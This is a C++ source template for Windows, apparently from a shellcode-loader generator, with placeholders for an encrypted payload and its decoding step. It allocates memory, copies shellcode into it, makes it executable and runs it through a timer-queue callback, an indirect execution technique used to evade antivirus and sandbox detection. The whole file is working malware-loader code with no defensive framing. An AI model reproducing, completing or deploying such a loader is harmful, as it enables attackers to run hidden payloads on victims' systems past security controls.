#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "syscall.h"


char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	HANDLE timer;
	HANDLE queue = ::CreateTimerQueue();
	HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!::CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)addr, NULL, 100, 0, 0)) {

		printf("Fail");
	}

	if (::WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
		printf("WaitForSingleObject failed (%d)\n", GetLastError());

}